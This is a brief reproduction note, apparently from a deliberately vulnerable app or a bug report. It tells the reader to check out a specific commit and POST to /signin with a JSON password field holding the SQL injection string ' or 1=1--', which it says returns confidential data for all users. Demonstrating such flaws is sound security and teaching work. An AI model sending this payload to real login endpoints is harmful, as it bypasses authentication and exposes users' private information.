Checkout commit `6765d361eca2b7c9ac12d7c328a2de1d08cab787` and make a POST request to `/signin` with the following body as JSON:

```
{
	"username": "riri",
	"password": "' or 1=1--'"
}
```

You should retrieve confidential information for all users.
